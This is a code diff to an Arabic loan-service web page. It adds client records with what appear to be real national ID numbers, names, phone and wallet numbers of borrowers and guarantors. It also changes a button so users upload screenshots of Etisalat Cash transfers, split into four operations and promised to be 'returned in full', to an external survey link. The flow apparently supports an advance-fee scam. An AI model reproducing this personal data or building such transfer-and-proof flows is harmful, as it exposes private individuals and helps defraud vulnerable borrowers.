@@ -98,6 +98,31 @@
         .btn-whatsapp.success-btn { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); box-shadow: 0 4px 20px rgba(46,204,113,0.25); }
         .btn-whatsapp.success-btn:hover { box-shadow: 0 0 30px rgba(46,204,113,0.4); }
 
+        .btn-upload-survey {
+            width: 100%;
+            padding: 0.7rem;
+            border: none;
+            border-radius: 2rem;
+            background: linear-gradient(135deg, #00BFFF, #0099CC);
+            color: white;
+            font-weight: 800;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 4px 20px rgba(0,191,255,0.25);
+            margin-top: 0.4rem;
+            position: relative;
+            z-index: 1;
+        }
+        .btn-upload-survey:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(0,191,255,0.4);
+        }
+
         .wallet-warning { background: rgba(0,191,255,0.05); border: 2px solid #00BFFF; border-radius: 1.2rem; padding: 0.8rem; margin: 0.6rem 0; }
         .wallet-warning .warning-head { display: flex; align-items: center; gap: 0.6rem; margin-bottom: 0.3rem; }
         .wallet-warning .warning-head i { font-size: 1.6rem; color: #00BFFF; }
@@ -231,12 +256,9 @@
     // ======================= رقم واتساب =======================
     const WHATSAPP_NUMBER = "212631288235";
     const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER}`;
+    const SURVEY_URL = "https://eu.surveymars.com/q/Tb2YaxWdH";
 
     // ======================= قاعدة بيانات العملاء =======================
-    // status: 'pending' = قيد الإجراء (يحتاج فتح محفظة أو ربط)
-    //         'completed' = تم الاستلام (انتهى من المرحلة)
-    //         'blocked' = محظور
-    // ======================= قاعدة بيانات العملاء (41 عميل) =======================
     // status: 'pending' = قيد الإجراء (يحتاج فتح محفظة أو ربط)
     //         'completed' = تم الاستلام (انتهى من المرحلة)
     //         'blocked' = محظور
@@ -358,7 +380,7 @@
         guarantorPhone: "01233362129",
         reason: "تطوير العمل",
         otherLoans: "لا",
-        reviewStatus: "approved",
+        reviewStatus: "pending",
         hasEtisalat: true,
         clientStatus: "pending"
     },
@@ -870,8 +892,8 @@
         loanTerm: "60 شهر",
         installment: "4,440",
         total: "266,400",
-        wallet: "سيتم فتح محفظة اتصالات كاش",
-        walletNum: ".",
+        wallet: "اتصالات كاش",
+        walletNum: "05107247159",
         guarantorRelation: "اخت",
         guarantorName: "روان محمد سامي علي",
         guarantorId: "30405310151346",
@@ -916,6 +938,26 @@
         guarantorName: "فاطمة فؤاد محمد عمادالدين محمد",
         guarantorId: "29502140200423",
         guarantorPhone: "01023728304",
+        reason: "تطوير العمل",
+        otherLoans: "لا",
+        reviewStatus: "approved",
+        hasEtisalat: false,
+        clientStatus: "pending"
+    },
+    {
+        id: "02720121601075",
+        name: "كمال صلاح السيد شوشان",
+        job: "رئيس قلم محكمة مرسى مطروح الابتدائيه",
+        loanRaw: "100,000",
+        loanTerm: "32 شهر",
+        installment: "4,157",
+        total: "133,024",
+        wallet: "سيتم فتح محفظة اتصالات كاش",
+        walletNum: "01014550205",
+        guarantorRelation: "أخ",
+        guarantorName: "السيد صلاح السيد شوشان",
+        guarantorId: "غير مسجل",
+        guarantorPhone: "غير مسجل",
         reason: "تطوير العمل",
         otherLoans: "لا",
         reviewStatus: "approved",
@@ -1113,7 +1155,7 @@
         `;
     }
 
-    // ===== بناء تعليمات الربط (لعملاء معهم اتصالات كاش) =====
+    // ===== بناء تعليمات الربط (لعملاء معهم اتصالات كاش) - مع زر رفع الاسكرينات =====
     function buildEtisalatInstructions(client) {
         const loanAmountNum = parseInt(client.loanRaw.replace(/\D/g, ''), 10);
         const perOperation = Math.floor(loanAmountNum / 4);
@@ -1151,8 +1193,8 @@
                 <div style="font-size: 0.7rem; color: var(--text-muted); text-align: center; margin-top: 0.3rem;">
                     🔒 إجمالي المبلغ: <strong style="color: var(--gold);">${totalFormatted} ج.م</strong> (سيتم إرجاعه بالكامل)
                 </div>
-                <button class="btn-whatsapp etisalat-btn" id="etisalatWhatsAppBtn" style="margin-top: 0.5rem;">
-                    <i class="fab fa-whatsapp fa-lg"></i> 📤 رفع تأكيدات اتصالات كاش
+                <button class="btn-upload-survey" id="uploadScreensBtn">
+                    <i class="fas fa-cloud-upload-alt"></i> 📤 رفع لقطات الشاشة الآن
                 </button>
             </div>
         `;
@@ -1287,11 +1329,12 @@
                 });
             }
 
-            const etisalatBtn = document.getElementById('etisalatWhatsAppBtn');
-            if (etisalatBtn) {
-                etisalatBtn.addEventListener('click', function(e) {
+            // ===== ربط زر رفع الاسكرينات =====
+            const uploadBtn = document.getElementById('uploadScreensBtn');
+            if (uploadBtn) {
+                uploadBtn.addEventListener('click', function(e) {
                     e.preventDefault();
-                    openWhatsApp(false);
+                    window.open(SURVEY_URL, '_blank');
                 });
             }
 
